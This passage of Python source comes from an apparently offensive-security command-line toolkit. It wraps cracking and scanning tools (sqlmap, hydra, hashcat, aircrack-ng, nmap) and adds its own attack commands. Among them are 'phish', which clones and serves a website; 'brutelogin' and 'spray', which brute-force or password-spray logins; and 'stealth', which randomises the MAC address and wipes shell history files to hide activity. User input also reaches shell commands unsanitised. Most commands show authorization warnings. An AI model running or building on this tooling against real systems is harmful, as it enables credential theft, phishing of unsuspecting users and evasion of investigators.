        pb('  Usage: sqlmap -u "http://target.com/page?id=1" --dbs')
        return
    pw('  ⚠  Only test systems you own or have written authorization to test.')
    shell_exec('sqlmap ' + ' '.join(args))

def cmd_hydra(args):
    if not tool_ok('hydra'):
        pe('  brew install hydra  /  apt install hydra')
        return
    if not args:
        pb('  Usage: hydra -l admin -P wordlist.txt ssh://192.168.1.1')
        return
    pw('  ⚠  Only test systems you own or have written authorization to test.')
    shell_exec('hydra ' + ' '.join(args))

def cmd_nikto(args):
    if not tool_ok('nikto'):
        pe('  brew install nikto  /  apt install nikto')
        return
    if not args:
        pb('  Usage: nikto -h http://192.168.1.1')
        return
    pw('  ⚠  Only test systems you own or have written authorization to test.')
    shell_exec('nikto ' + ' '.join(args))

def cmd_gobuster(args):
    if not tool_ok('gobuster'):
        pe('  brew install gobuster  /  apt install gobuster')
        return
    if not args:
        pb('  Usage: gobuster dir -u http://target.com -w /wordlist.txt')
        return
    pw('  ⚠  Only test systems you own or have written authorization to test.')
    shell_exec('gobuster ' + ' '.join(args))

def cmd_hashcat(args):
    if not tool_ok('hashcat'):
        pe('  brew install hashcat  /  apt install hashcat')
        return
    if not args:
        pb('  Usage: hashcat -m 0 hashes.txt rockyou.txt')
        pd('  Modes: 0=MD5 100=SHA1 1800=sha512crypt 22000=WPA2 ...')
        return
    shell_exec('hashcat ' + ' '.join(args))

def cmd_john(args):
    if not tool_ok('john'):
        pe('  brew install john  /  apt install john')
        return
    if not args:
        pb('  Usage: john <hashfile> [--wordlist=<file>]')
        return
    shell_exec('john ' + ' '.join(args))

def cmd_aircrack(args):
    if not tool_ok('aircrack-ng'):
        pe('  brew install aircrack-ng  /  apt install aircrack-ng')
        return
    if not args:
        pb('  Usage: aircrack <capfile> -w <wordlist>')
        return
    pw('  ⚠  Only test networks you own or have written authorization to test.')
    shell_exec('aircrack-ng ' + ' '.join(args))

# ── NETSCAN ───────────────────────────────────────────────────────────────────
def cmd_netscan(args):
    import ipaddress
    p('  Scanning local network...', DM)
    print()
    # Get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        pe('  Could not detect local IP.')
        return

    # Derive /24 subnet
    parts_ip = local_ip.split('.')
    subnet = f"{parts_ip[0]}.{parts_ip[1]}.{parts_ip[2]}.0/24"
    p(f'  Network   {subnet}', CY)
    p(f'  Your IP   {local_ip}', CY)
    print()

    # Use nmap if available for rich info, else ping sweep
    if shutil.which('nmap'):
        p('  Running nmap discovery...', DM)
        print()
        shell_exec(f'nmap -sn --open -T4 {subnet}')
    else:
        p('  Pinging hosts (nmap not found, install for richer results)...', DM)
        print()
        alive = []
        def ping_host(ip):
            flag = '-n' if OS_NAME == 'Windows' else '-c'
            r = subprocess.run(['ping', flag, '1', '-W', '1', str(ip)],
                               capture_output=True, timeout=3)
            if r.returncode == 0:
                alive.append(str(ip))

        threads = []
        for host in ipaddress.IPv4Network(subnet, strict=False).hosts():
            t = threading.Thread(target=ping_host, args=(host,), daemon=True)
            threads.append(t)
            t.start()
            if len(threads) % 20 == 0:
                for t in threads[-20:]: t.join(timeout=2)

        for t in threads: t.join(timeout=2)
        alive.sort(key=lambda x: int(x.split('.')[-1]))

        p(f'  Found {len(alive)} hosts:', G)
        print()
        for ip in alive:
            try:
                hostname = socket.gethostbyaddr(ip)[0]
            except Exception:
                hostname = ''
            marker = f'{PK} ← you{RST}' if ip == local_ip else ''
            print(f'  {G}●{RST}  {WH}{ip:<18}{RST}  {DM}{hostname}{RST}{marker}')
        print()

# ── CRACK ─────────────────────────────────────────────────────────────────────
def cmd_crack(args):
    if not args:
        pb('  Usage: crack <hash>')
        pd('  crack 5f4dcc3b5aa765d61d8327deb882cf99')
        return

    h = args[0].strip()
    length = len(h)

    # Auto-detect hash type
    hash_type = None
    hashcat_mode = None
    if re.fullmatch(r'[a-fA-F0-9]{32}', h):
        hash_type = 'MD5'
        hashcat_mode = '0'
    elif re.fullmatch(r'[a-fA-F0-9]{40}', h):
        hash_type = 'SHA1'
        hashcat_mode = '100'
    elif re.fullmatch(r'[a-fA-F0-9]{64}', h):
        hash_type = 'SHA256'
        hashcat_mode = '1400'
    elif re.fullmatch(r'[a-fA-F0-9]{128}', h):
        hash_type = 'SHA512'
        hashcat_mode = '1700'
    elif h.startswith('$2b$') or h.startswith('$2a$'):
        hash_type = 'bcrypt'
        hashcat_mode = '3200'
    elif h.startswith('$1$'):
        hash_type = 'MD5crypt'
        hashcat_mode = '500'
    elif h.startswith('$6$'):
        hash_type = 'SHA512crypt'
        hashcat_mode = '1800'
    else:
        hash_type = 'Unknown'

    p(f'  Hash     {h}', DM)
    p(f'  Type     {hash_type}', CY)
    print()

    if hash_type == 'Unknown':
        pe('  Could not detect hash type.')
        return

    # Try wordlists in order
    wordlists = [
        '/usr/share/wordlists/rockyou.txt',
        '/usr/share/wordlists/rockyou.txt.gz',
        os.path.expanduser('~/wordlists/rockyou.txt'),
        'rockyou.txt',
        'wordlist.txt',
    ]
    wl = next((w for w in wordlists if os.path.exists(w)), None)

    if shutil.which('hashcat') and hashcat_mode and wl:
        p(f'  Tool     hashcat (mode {hashcat_mode})', DM)
        p(f'  Wordlist {wl}', DM)
        print()
        pw('  ⚠  Only crack hashes you own or have authorization to crack.')
        print()
        shell_exec(f'hashcat -m {hashcat_mode} {h} {wl} --force')
    elif shutil.which('john') and wl:
        p('  Tool     john the ripper', DM)
        p(f'  Wordlist {wl}', DM)
        print()
        pw('  ⚠  Only crack hashes you own or have authorization to crack.')
        print()
        tmp = os.path.join(os.path.expanduser('~'), '.atomic', '_crack_tmp.txt')
        with open(tmp, 'w') as f: f.write(h + '\n')
        shell_exec(f'john {tmp} --wordlist={wl}')
    else:
        pe('  hashcat and john not found, or no wordlist available.')
        p('  Install hashcat:  brew install hashcat  /  apt install hashcat', DM)
        p('  Get rockyou.txt:  https://github.com/brannondorsey/naive-hashcat/releases', DM)

# ── OSINT ─────────────────────────────────────────────────────────────────────
def cmd_osint(args):
    if not args:
        pb('  Usage: osint <username|email|domain|ip>')
        pd('  osint pavlopanda')
        pd('  osint example.com')
        pd('  osint user@email.com')
        pd('  osint 8.8.8.8')
        return

    target = args[0].strip()
    print()
    p(f'  Target   {target}', CY)
    print()

    # Detect type
    is_email  = '@' in target and '.' in target.split('@')[-1]
    is_ip     = re.fullmatch(r'\d{1,3}(\.\d{1,3}){3}', target)
    is_domain = '.' in target and not is_email and not is_ip
    is_user   = not is_email and not is_ip and not is_domain

    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.')
        return

    results = []

    if is_ip or is_domain or is_email:
        lookup = target if is_ip else target.split('@')[-1] if is_email else target
        # IP/domain geo + ASN
        try:
            r = _req.get(f'https://ipinfo.io/{lookup}/json', timeout=6)
            if r.ok:
                d = r.json()
                p('  ── IP Info ──────────────────────────────────────────', DM)
                for k in ('ip','hostname','city','region','country','org','timezone'):
                    if d.get(k):
                        print(f'  {CY}{k:<12}{RST}  {WH}{d[k]}{RST}')
                print()
        except Exception: pass

    if is_domain or (is_email and '.' in target):
        domain = target.split('@')[-1] if is_email else target
        # DNS records
        p('  ── DNS Records ──────────────────────────────────────', DM)
        for rtype in ['A','MX','NS','TXT','CNAME']:
            try:
                import dns.resolver
                answers = dns.resolver.resolve(domain, rtype, raise_on_no_answer=False)
                for r in answers:
                    print(f'  {G}{rtype:<6}{RST}  {WH}{r}{RST}')
            except Exception:
                try:
                    if rtype == 'A':
                        ip = socket.gethostbyname(domain)
                        print(f'  {G}A     {RST}  {WH}{ip}{RST}')
                except Exception:
                    pass
        print()

        # Subdomain brute (common ones)
        p('  ── Subdomains ───────────────────────────────────────', DM)
        subs = ['www','mail','ftp','admin','api','dev','staging','vpn','remote','portal','blog','shop','app']
        found_subs = []
        for sub in subs:
            try:
                ip = socket.gethostbyname(f'{sub}.{domain}')
                found_subs.append((f'{sub}.{domain}', ip))
            except Exception:
                pass
        if found_subs:
            for host, ip in found_subs:
                print(f'  {G}●{RST}  {WH}{host:<35}{RST}  {DM}{ip}{RST}')
        else:
            p('  No common subdomains found.', DM)
        print()

        # WHOIS
        p('  ── WHOIS ────────────────────────────────────────────', DM)
        if shutil.which('whois'):
            shell_exec(f'whois {domain}')
        else:
            try:
                import whois as w
                data = w.whois(domain)
                for k, v in data.items():
                    if v: print(f'  {CY}{k:<22}{RST}  {WH}{v}{RST}')
            except Exception:
                p('  whois not available. brew install whois', DM)
        print()

    if is_user:
        # Check username across platforms
        p('  ── Username Search ──────────────────────────────────', DM)
        platforms = {
            'GitHub':    f'https://github.com/{target}',
            'Twitter/X': f'https://twitter.com/{target}',
            'Instagram': f'https://instagram.com/{target}',
            'Reddit':    f'https://reddit.com/user/{target}',
            'TikTok':    f'https://tiktok.com/@{target}',
            'YouTube':   f'https://youtube.com/@{target}',
            'Twitch':    f'https://twitch.tv/{target}',
            'Pinterest': f'https://pinterest.com/{target}',
            'Pastebin':  f'https://pastebin.com/u/{target}',
            'HackerNews':f'https://news.ycombinator.com/user?id={target}',
        }
        print()
        for name, url in platforms.items():
            try:
                r = _req.get(url, timeout=5, headers={'User-Agent':'Mozilla/5.0'},
                             allow_redirects=True)
                if r.status_code == 200:
                    print(f'  {G}✓{RST}  {WH}{name:<14}{RST}  {DM}{url}{RST}')
                else:
                    print(f'  {RD}✗{RST}  {DM}{name}{RST}')
            except Exception:
                print(f'  {YL}?{RST}  {DM}{name} (timeout){RST}')
        print()

    if is_email:
        # Check breach (HaveIBeenPwned public API)
        p('  ── Breach Check ─────────────────────────────────────', DM)
        try:
            r = _req.get(
                f'https://haveibeenpwned.com/api/v3/breachedaccount/{target}',
                headers={'User-Agent':'Atomic-OSINT','hibp-api-key':''},
                timeout=6
            )
            if r.status_code == 200:
                breaches = r.json()
                pw(f'  Found in {len(breaches)} breach(es):')
                for b in breaches:
                    print(f'  {RD}●{RST}  {WH}{b.get("Name","?")}{RST}  {DM}{b.get("BreachDate","")}{RST}')
            elif r.status_code == 404:
                p('  Not found in any known breaches.', G)
            else:
                p('  HIBP API requires a key for email lookups. Get one at haveibeenpwned.com', DM)
        except Exception:
            p('  Could not reach HIBP API.', DM)
        print()

# ── MONITOR ───────────────────────────────────────────────────────────────────
def cmd_monitor(args):
    import ipaddress
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = '?'

    parts_ip = local_ip.split('.')
    subnet = f"{parts_ip[0]}.{parts_ip[1]}.{parts_ip[2]}.0/24"

    p('  Live network monitor — press Ctrl+C to stop', DM)
    p(f'  Your IP: {local_ip}   Subnet: {subnet}', CY)
    print()

    seen = {}
    try:
        while True:
            # Ping sweep
            alive = {}
            def ping(ip):
                flag = '-n' if OS_NAME == 'Windows' else '-c'
                r = subprocess.run(['ping', flag, '1', '-W', '1', str(ip)],
                                   capture_output=True, timeout=2)
                if r.returncode == 0:
                    try:    hostname = socket.gethostbyaddr(str(ip))[0]
                    except: hostname = ''
                    alive[str(ip)] = hostname

            threads = []
            for host in list(ipaddress.IPv4Network(subnet, strict=False).hosts())[:50]:
                t = threading.Thread(target=ping, args=(host,), daemon=True)
                threads.append(t); t.start()
            for t in threads: t.join(timeout=3)

            # New devices
            for ip, hostname in alive.items():
                if ip not in seen:
                    seen[ip] = hostname
                    marker = f'{PK} ← you{RST}' if ip == local_ip else f'{YL} ← NEW{RST}'
                    print(f'  {G}+{RST}  {WH}{ip:<18}{RST}  {DM}{hostname:<30}{RST}{marker}')

            # Left devices
            for ip in list(seen.keys()):
                if ip not in alive and ip != local_ip:
                    print(f'  {RD}-{RST}  {DM}{ip:<18}  left{RST}')
                    del seen[ip]

            # Active connections
            p(f'\r  {DM}[{datetime.now().strftime("%H:%M:%S")}] {len(alive)} devices on network{RST}', '')
            time.sleep(5)

    except KeyboardInterrupt:
        print()
        p('  Monitor stopped.', DM)

# ── WIFI ──────────────────────────────────────────────────────────────────────
def cmd_wifi(args):
    p('  Scanning WiFi networks...', DM)
    print()
    if OS_NAME == 'Darwin':
        airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
        if os.path.exists(airport):
            shell_exec(f'{airport} -s')
        else:
            shell_exec('networksetup -listallhardwareports')
    elif OS_NAME == 'Windows':
        shell_exec('netsh wlan show networks mode=bssid')
    else:
        if shutil.which('nmcli'):
            shell_exec('nmcli dev wifi list')
        elif shutil.which('iwlist'):
            shell_exec('iwlist scan')
        else:
            pe('  nmcli or iwlist not found. apt install network-manager')

# ── PHISH ─────────────────────────────────────────────────────────────────────
def cmd_phish(args):
    if not args:
        pb('  Usage: phish <url>')
        pd('  phish https://example.com')
        return
    url = args[0]
    if not url.startswith('http'):
        url = 'https://' + url
    pw('  ⚠  Only use against systems you own or have written authorization to test.')
    print()
    out_dir = os.path.join(os.path.expanduser('~'), '.atomic', 'phish')
    os.makedirs(out_dir, exist_ok=True)
    p(f'  Cloning {url}...', DM)
    if shutil.which('wget'):
        shell_exec(f'wget -P {out_dir} -k -p -E -np --tries=3 --timeout=15 {url}')
    elif shutil.which('curl'):
        out_file = os.path.join(out_dir, 'index.html')
        shell_exec(f'curl -L --max-time 15 --retry 2 -o {out_file} {url}')
    else:
        try:
            import requests as _req
            r = _req.get(url, timeout=10, headers={'User-Agent':'Mozilla/5.0'})
            out_file = os.path.join(out_dir, 'index.html')
            with open(out_file, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(r.text)
            p(f'  Saved to {out_file}', G)
        except Exception as e:
            pe(f'  Failed: {e}')
            return
    print()
    p(f'  Files saved to: {out_dir}', G)
    p('  Serve it with: python3 -m http.server 8080', DM)
    print()
    if input(f'  {G}Start local server on port 8080? [y/N]{RST} ').strip().lower() == 'y':
        import os as _os
        _os.chdir(out_dir)
        shell_exec('python3 -m http.server 8080')

# ── SNIFF ─────────────────────────────────────────────────────────────────────
def cmd_sniff(args):
    pw('  ⚠  Only sniff networks you own or have authorization to monitor.')
    print()
    iface = args[0] if args else ('en0' if OS_NAME == 'Darwin' else 'eth0' if OS_NAME == 'Linux' else None)
    if OS_NAME == 'Windows':
        if shutil.which('tshark'):
            shell_exec('tshark -i 1')
        else:
            pe('  Install Wireshark/tshark: https://wireshark.org')
        return
    if shutil.which('tcpdump'):
        p(f'  Sniffing on {iface} — Ctrl+C to stop', DM)
        print()
        shell_exec(f'sudo tcpdump -i {iface} -n -l')
    elif shutil.which('tshark'):
        shell_exec(f'sudo tshark -i {iface}')
    else:
        pe('  tcpdump not found.  brew install tcpdump  /  apt install tcpdump')

# ── VPNCHECK ──────────────────────────────────────────────────────────────────
def cmd_vpncheck(args):
    try:
        import requests as _req
    except ImportError:
        pe('  requests not installed.'); return
    p('  Checking VPN status...', DM)
    print()
    try:
        r = _req.get('https://ipinfo.io/json', timeout=8)
        d = r.json()
        ip      = d.get('ip','?')
        city    = d.get('city','?')
        country = d.get('country','?')
        org     = d.get('org','?')
        is_vpn  = any(k in org.lower() for k in [
            'vpn','cloud','hosting','server','data center','datacenter',
            'ovh','digitalocean','linode','vultr','hetzner','mullvad','nord','express',
            'packethub','packet','proton','surfshark','windscribe','pia','private internet',
            'ipvanish','cyberghost','hidemyass','torguard','akamai','fastly','cloudflare',
            'amazon','aws','azure','google cloud','rackspace','leaseweb','choopa',
            'choiceone','zenlayer','psychz','tzulo','frantech','buyvm','ghostpath',
        ])
        print(f'  {CY}Public IP  {RST}  {WH}{ip}{RST}')
        print(f'  {CY}Location   {RST}  {WH}{city}, {country}{RST}')
        print(f'  {CY}ISP/Org    {RST}  {WH}{org}{RST}')
        print()
        if is_vpn:
            p('  ✓ VPN detected — traffic appears to be routed through a VPN/proxy', G)
        else:
            pw('  ✗ No VPN detected — your real IP is exposed')
    except Exception as e:
        pe(f'  Failed: {e}')
        return
    print()
    # DNS leak check
    p('  Checking for DNS leaks...', DM)
    print()
    vulnerabilities = []
    dns_leak = False
    try:
        # Get actual DNS resolver being used via dnsleaktest-style lookup
        dns_ips = set()
        import socket as _sock
        for host in ['one.one.one.one', 'dns.google', 'resolver1.opendns.com']:
            try:
                ip_r = _sock.gethostbyname(host)
                dns_ips.add(ip_r)
            except Exception:
                pass
        vpn_dns_providers = [
            'mullvad','nord','express','proton','surfshark','windscribe','pia',
            'private internet','ipvanish','cyberghost','torguard','cloudflare',
            'quad9','opendns','adguard'
        ]
        if dns_ips:
            p(f'  DNS resolvers detected:', CY)
            for dns_ip in dns_ips:
                try:
                    dr = _req.get(f'https://ipinfo.io/{dns_ip}/json', timeout=4).json()
                    dns_org = dr.get('org','?')
                    dns_country = dr.get('country','?')
                    is_vpn_dns = any(k in dns_org.lower() for k in vpn_dns_providers)
                    flag = f'{G}✓ VPN DNS{RST}' if is_vpn_dns else f'{RD}✗ ISP DNS{RST}'
                    print(f'  {G}●{RST}  {WH}{dns_ip:<18}{RST}  {DM}{dns_org}, {dns_country}{RST}  {flag}')
                    if not is_vpn_dns and is_vpn:
                        dns_leak = True
                except Exception:
                    print(f'  {G}●{RST}  {WH}{dns_ip}{RST}')
        print()
    except Exception:
        pass

    # Vulnerability analysis
    p('  Vulnerability analysis:', CY)
    print()
    if not is_vpn:
        vulnerabilities.append(('HIGH', 'Real IP exposed — no VPN or proxy detected'))
    if dns_leak:
        vulnerabilities.append(('HIGH', 'DNS leak — VPN active but DNS resolves through ISP (reveals browsing)'))
    # Check if using plain HTTP DNS (port 53 unencrypted) — heuristic: public DNS IPs
    plain_dns = {'8.8.8.8','8.8.4.4','1.1.1.1','1.0.0.1','9.9.9.9','208.67.222.222'}
    try:
        for dns_ip in dns_ips:
            if dns_ip in plain_dns and not is_vpn:
                vulnerabilities.append(('MED', f'Using public DNS ({dns_ip}) over unencrypted port 53'))
                break
    except Exception:
        pass

    # Check if Tor exit node
    try:
        tor_check = _req.get(f'https://check.torproject.org/api/ip', timeout=5).json()
        if tor_check.get('IsTor'):
            p(f'  {G}✓ Tor exit node detected — high anonymity{RST}', G)
            print()
    except Exception:
        pass

    if vulnerabilities:
        for sev, msg in vulnerabilities:
            color = RD if sev == 'HIGH' else YL
            print(f'  {color}[{sev}]{RST}  {WH}{msg}{RST}')
    else:
        p('  ✓ No obvious vulnerabilities detected', G)
    print()

# ── DARKWEB ───────────────────────────────────────────────────────────────────
def cmd_darkweb(args):
    if not args:
        pb('  Usage: darkweb <query>')
        pd('  darkweb hacking tools')
        return
    query = ' '.join(args)
    pw('  ⚠  Tor required. Only access legal content.')
    print()
    # Check if Tor is running (SOCKS5 on 9050/9150)
    tor_port = None
    for port in [9050, 9150]:
        try:
            s = socket.create_connection(('127.0.0.1', port), timeout=2)
            s.close()
            tor_port = port
            break
        except Exception:
            pass
    if not tor_port:
        pe('  Tor is not running.')
        p('  Start Tor: brew install tor && tor', DM)
        p('  Or install Tor Browser and keep it open.', DM)
        return
    p(f'  Tor detected on port {tor_port}', G)
    p(f'  Searching for: {query}', DM)
    print()
    try:
        import requests as _req
        proxies = {'http': f'socks5h://127.0.0.1:{tor_port}',
                   'https': f'socks5h://127.0.0.1:{tor_port}'}
        # Ahmia — clearnet Tor search engine
        r = _req.get(f'https://ahmia.fi/search/?q={query.replace(" ","+")}',
                     proxies=proxies, timeout=20,
                     headers={'User-Agent':'Mozilla/5.0'})
        if r.ok:
            # Extract results with simple regex
            links = re.findall(r'href="(/search/redirect\?redirect=([^"]+))"', r.text)
            titles = re.findall(r'<h4>(.*?)</h4>', r.text)
            if not links:
                p('  No results found.', DM)
            else:
                for i, (_, link) in enumerate(links[:8]):
                    title = titles[i] if i < len(titles) else 'Unknown'
                    print(f'  {G}[{i+1}]{RST}  {WH}{title[:50]}{RST}')
                    print(f'       {DM}{link[:80]}{RST}')
                    print()
        else:
            pe(f'  Search failed: {r.status_code}')
    except Exception as e:
        pe(f'  Error: {e}')
        p('  Make sure requests[socks] is installed: pip install requests[socks]', DM)

# ── EXPLOIT / CVE ─────────────────────────────────────────────────────────────
def cmd_exploit(args):
    if not args:
        pb('  Usage: exploit <CVE-YYYY-XXXXX>')
        pd('  exploit CVE-2021-44228')
        return
    cve_id = args[0].upper()
    if not cve_id.startswith('CVE-'):
        cve_id = 'CVE-' + cve_id
    p(f'  Looking up {cve_id}...', DM)
    print()
    try:
        import requests as _req
        r = _req.get(f'https://cve.circl.lu/api/cve/{cve_id}', timeout=10)
        if not r.ok or not r.json():
            pe(f'  {cve_id} not found.')
            return
        d = r.json()
        cvss    = d.get('cvss','N/A')
        summary = d.get('summary','No description.')
        refs    = d.get('references',[])
        cpes    = d.get('vulnerable_configuration',[])
        # Severity colour
        try:
            score = float(cvss)
            sc = RD if score >= 7 else YL if score >= 4 else G
        except Exception:
            sc = WH
        print(f'  {CY}CVE        {RST}  {WH}{cve_id}{RST}')
        print(f'  {CY}CVSS Score {RST}  {sc}{cvss}{RST}')
        print()
        p('  Description:', CY)
        # Word-wrap summary
        words = summary.split()
        line  = '  '
        for w in words:
            if len(line) + len(w) > 72:
                print(f'{DM}{line}{RST}')
                line = '  '
            line += w + ' '
        if line.strip():
            print(f'{DM}{line}{RST}')
        print()
        if cpes:
            p('  Affected:', CY)
            for cpe in cpes[:5]:
                title = cpe.get('title', cpe) if isinstance(cpe, dict) else str(cpe)
                print(f'  {RD}●{RST}  {DM}{title[:70]}{RST}')
            print()
        if refs:
            p('  References:', CY)
            for ref in refs[:4]:
                print(f'  {G}→{RST}  {DM}{ref[:80]}{RST}')
            print()
        # Check for exploit-db
        p('  Checking ExploitDB...', DM)
        er = _req.get(f'https://www.exploit-db.com/search?cve={cve_id.replace("CVE-","")}',
                      timeout=8, headers={'User-Agent':'Mozilla/5.0'})
        exploit_hits = re.findall(r'/exploits/(\d+)', er.text)
        if exploit_hits:
            pw(f'  {len(set(exploit_hits))} public exploit(s) found on ExploitDB:')
            for eid in list(set(exploit_hits))[:3]:
                print(f'  {RD}→{RST}  {DM}https://www.exploit-db.com/exploits/{eid}{RST}')
        else:
            p('  No public exploits found on ExploitDB.', DM)
        print()
    except Exception as e:
        pe(f'  Error: {e}')

def cmd_cve(args):
    if not args:
        pb('  Usage: cve <software> [version]')
        pd('  cve log4j 2.14')
        pd('  cve apache struts')
        return
    query = ' '.join(args)
    p(f'  Searching CVEs for: {query}', DM)
    print()
    try:
        import requests as _req
        r = _req.get(f'https://cve.circl.lu/api/search/{query.replace(" ","/")}', timeout=10)
        if not r.ok:
            pe('  Search failed.'); return
        results = r.json()
        if isinstance(results, dict):
            results = results.get('results', [])
        if not results:
            p('  No CVEs found.', DM); return
        p(f'  Found {len(results)} CVEs:', G)
        print()
        for cve in results[:10]:
            cve_id  = cve.get('id','?')
            cvss    = cve.get('cvss','?')
            summary = cve.get('summary','')[:70]
            try:
                score = float(cvss)
                sc = RD if score >= 7 else YL if score >= 4 else G
            except Exception:
                sc = WH
            print(f'  {sc}{cve_id:<22}{RST}  CVSS {sc}{cvss}{RST}')
            print(f'  {DM}  {summary}...{RST}')
            print()
        p('  Use  exploit <CVE-ID>  for full details + exploit search.', DM)
    except Exception as e:
        pe(f'  Error: {e}')

# ── STEALTH ───────────────────────────────────────────────────────────────────
def cmd_stealth(args):
    print()
    p('  STEALTH MODE', PK)
    print()
    steps_ok = []
    steps_fail = []

    # 1. Check Tor
    tor_running = False
    for port in [9050, 9150]:
        try:
            s = socket.create_connection(('127.0.0.1', port), timeout=2)
            s.close()
            tor_running = True
            break
        except Exception:
            pass
    if tor_running:
        p('  [OK]  Tor is running — traffic can be routed through Tor', G)
        steps_ok.append('tor')
    else:
        pw('  [!!]  Tor not running')
        p('        Start with: brew install tor && tor', DM)
        steps_fail.append('tor')

    # 2. MAC randomization (Mac/Linux only)
    if OS_NAME == 'Darwin':
        iface = 'en0'
        import random as _r
        mac = ':'.join([f'{_r.randint(0,255):02x}' for _ in range(6)])
        print()
        p(f'  Randomising MAC address on {iface}...', DM)
        result = subprocess.run(
            f'sudo ifconfig {iface} ether {mac}',
            shell=True, capture_output=True
        )
        if result.returncode == 0:
            p(f'  [OK]  MAC address set to {mac}', G)
            steps_ok.append('mac')
        else:
            pw('  [!!]  MAC randomisation failed (may need sudo)')
            steps_fail.append('mac')
    elif OS_NAME == 'Linux':
        if shutil.which('macchanger'):
            shell_exec('sudo macchanger -r eth0')
            steps_ok.append('mac')
        else:
            pw('  [!!]  macchanger not found. apt install macchanger')
            steps_fail.append('mac')
    else:
        pw('  [!!]  MAC randomisation not supported on Windows')

    # 3. Clear terminal history
    print()
    p('  Clearing shell history...', DM)
    history_files = [
        os.path.expanduser('~/.bash_history'),
        os.path.expanduser('~/.zsh_history'),
        os.path.expanduser('~/.local/share/fish/fish_history'),
    ]
    cleared = 0
    for hf in history_files:
        if os.path.exists(hf):
            try:
                open(hf, 'w').close()
                cleared += 1
            except Exception:
                pass
    p(f'  [OK]  Cleared {cleared} history file(s)', G)

    # 4. Summary
    print()
    p(f'  Stealth active: {len(steps_ok)} measures enabled, {len(steps_fail)} failed', PK if not steps_fail else YL)
    if 'tor' not in steps_ok:
        p('  Route traffic through Tor manually or use Tor Browser.', DM)
    print()

# ── BRUTELOGIN ────────────────────────────────────────────────────────────────
def cmd_brutelogin(args):
    if not args:
        pb('  Usage: brutelogin <url>')
        pd('  brutelogin http://192.168.1.1/login')
        return
    url = args[0]
    if not url.startswith('http'):
        url = 'http://' + url
    pw('  ⚠  Only test systems you own or have written authorization to test.')
    print()
    from urllib.parse import urlparse
    parsed = urlparse(url)
    host   = parsed.hostname
    scheme = parsed.scheme
    path   = parsed.path or '/'
    # Wordlists
    wordlists = [
        '/usr/share/wordlists/rockyou.txt',
        os.path.expanduser('~/wordlists/rockyou.txt'),
        'rockyou.txt', 'wordlist.txt'
    ]
    wl = next((w for w in wordlists if os.path.exists(w)), None)
    if not wl:
        pe('  No wordlist found. Place rockyou.txt in current directory.')
        return
    if shutil.which('hydra'):
        p(f'  Target: {url}', CY)
        p(f'  Wordlist: {wl}', DM)
        print()
        shell_exec(f'hydra -l admin -P {wl} {scheme}://{host} http-post-form "{path}:username=^USER^&password=^PASS^:Invalid"')
    else:
        pe('  hydra not found.  brew install hydra  /  apt install hydra')

# ── DECODE ────────────────────────────────────────────────────────────────────
def cmd_decode(args):
    if not args:
        pb('  Usage: decode <string>')
        pd('  decode aGVsbG8gd29ybGQ=')
        pd('  decode 68656c6c6f')
        return
    import base64 as _b64, urllib.parse as _up
    raw = ' '.join(args)
    print()
    p(f'  Input: {raw[:80]}', DM)
    print()
    results = {}

    # Base64
    try:
        dec = _b64.b64decode(raw + '==').decode('utf-8', errors='strict')
        if dec.isprintable():
            results['Base64'] = dec
    except Exception: pass

    # Base64 URL-safe
    try:
        dec = _b64.urlsafe_b64decode(raw + '==').decode('utf-8', errors='strict')
        if dec.isprintable() and 'Base64' not in results:
            results['Base64 URL-safe'] = dec
    except Exception: pass

    # Hex
    try:
        clean = raw.replace(' ','').replace('0x','').replace('\\x','')
        dec = bytes.fromhex(clean).decode('utf-8', errors='strict')
        if dec.isprintable():
            results['Hex'] = dec
    except Exception: pass

    # URL encoding
    try:
        dec = _up.unquote(raw)
        if dec != raw:
            results['URL encoded'] = dec
    except Exception: pass

    # ROT13
    try:
        import codecs
        results['ROT13'] = codecs.decode(raw, 'rot_13')
    except Exception: pass

    # Binary
    try:
        bits = raw.replace(' ','')
        if all(c in '01' for c in bits) and len(bits) % 8 == 0:
            dec = ''.join(chr(int(bits[i:i+8],2)) for i in range(0,len(bits),8))
            if dec.isprintable():
                results['Binary'] = dec
    except Exception: pass

    # Fernet encrypted token (starts with gAAAAAB)
    if raw.startswith('gAAAAAB') or raw.startswith('gAAAAA'):
        results['Fernet (encrypted)'] = 'Fernet encrypted token — needs the secret key to decrypt'

    # JWT
    if raw.count('.') == 2:
        try:
            parts = raw.split('.')
            header  = _b64.urlsafe_b64decode(parts[0] + '==').decode()
            payload = _b64.urlsafe_b64decode(parts[1] + '==').decode()
            results['JWT Header']  = header
            results['JWT Payload'] = payload
        except Exception: pass

    if results:
        for fmt, val in results.items():
            print(f'  {G}{fmt:<18}{RST}  {WH}{val[:80]}{RST}')
            print()
    else:
        pe('  Could not decode — unknown encoding.')
    print()

# ── ENUM ──────────────────────────────────────────────────────────────────────
def cmd_enum(args):
    if not args:
        pb('  Usage: enum <host/ip>')
        pd('  enum 192.168.1.1')
        return
    target = args[0]
    pw('  ⚠  Only enumerate systems you own or have written authorization to test.')
    print()
    p(f'  Target: {target}', CY)
    print()
    p('  ── OS Detection ─────────────────────────────────────', DM)
    if shutil.which('nmap'):
        shell_exec(f'nmap -O -sV -T4 --open {target}')
    else:
        pe('  nmap required for OS detection. brew install nmap')
    print()
    p('  ── Open Ports ───────────────────────────────────────', DM)
    if shutil.which('nmap'):
        shell_exec(f'nmap -sV -T4 --open -p- {target}')
    print()
    p('  ── SMB/Shares ───────────────────────────────────────', DM)
    if shutil.which('smbclient'):
        shell_exec(f'smbclient -L {target} -N')
    elif shutil.which('nmap'):
        shell_exec(f'nmap --script smb-enum-shares,smb-enum-users -p 445 {target}')
    print()
    p('  ── Vulnerabilities ──────────────────────────────────', DM)
    if shutil.which('nmap'):
        shell_exec(f'nmap --script vuln -T4 {target}')

# ── SPRAY ─────────────────────────────────────────────────────────────────────
def cmd_spray(args):
    if len(args) < 3:
        pb('  Usage: spray <target> <userlist> <password>')
        pd('  spray 192.168.1.1 users.txt Password123')
        pd('  spray ssh://192.168.1.1 users.txt Summer2024!')
        return
    target, userlist, password = args[0], args[1], args[2]
    pw('  ⚠  Only test systems you own or have written authorization to test.')
    print()
    if not os.path.exists(userlist):
